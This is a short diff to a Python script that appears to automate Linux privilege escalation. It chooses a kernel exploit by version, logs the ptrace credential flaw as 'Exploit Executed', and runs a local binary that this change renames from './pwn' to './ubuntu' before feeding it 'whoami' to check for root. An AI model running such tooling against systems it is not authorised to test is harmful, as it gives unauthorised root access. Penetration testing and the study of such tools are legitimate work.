@@ -71,7 +71,7 @@ if operating_system == "Linux":
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
         elif kernel_name1 == "5.4.0":
-            args = ["./pwn"]
+            args = ["./ubuntu"]
             child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
             child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
             print(child_process_output)
